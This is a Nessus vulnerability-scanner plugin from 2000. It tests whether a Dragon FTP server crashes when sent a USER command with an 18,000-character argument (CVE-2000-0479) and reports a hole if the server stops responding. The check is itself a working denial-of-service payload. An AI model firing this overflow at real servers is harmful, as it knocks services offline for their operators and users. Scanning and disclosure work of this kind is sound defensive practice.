#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10450);
 script_bugtraq_id(1352);
 script_version ("$Revision: 1.13 $");
 script_cve_id("CVE-2000-0479");
 name["english"] = "Dragon FTP overflow";
 name["francais"] = "Dragon FTP overflow";
 
 
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It was possible to
shut down the remote FTP server by issuing
a USER command followed by a far too long
argument (over 16,000 chars)

This problem allows an attacker to prevent
your site from sharing some resources
with the rest of the world.

Solution : upgrade to the latest version your FTP server.

Risk factor : High";


 desc["francais"] = "Il s'est avéré possible
de couper le serveur FTP distant en 
faisant la commande 'USER' suivie d'un argument
trop long (de plus de 16.000 octets).

Ce problème permet à des pirates en herbe
d'empecher votre site de partager certaines
ressources avec le reste du monde.

Solution : mettez à jour votre server FTP.

Facteur de risque : Elevé";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Attempts a USER buffer overflows";
 summary["francais"] = "Essaye un USER buffers overflows";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "ftp_anonymous.nasl");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

include("ftp_func.inc");
port = get_kb_item("Services/ftp");
if(!port)port = 21;

if(!get_port_state(port))exit(0);

soc = open_sock_tcp(port);
if(soc)
{
  r = ftp_recv_line(socket:soc);
  if(r)
  {
  req = string("USER ", crap(18000), "\r\n");
  send(socket:soc, data:req);
  r = ftp_recv_line(socket:soc);
  close(soc);
  sleep(1);

  soc2 = open_sock_tcp(port);
  if(!soc2)security_hole(port);
  else {
  	r2 = ftp_recv_line(socket:soc2);
  	close(soc2);
	if(!r2)security_hole(port);
      }
  }  
}
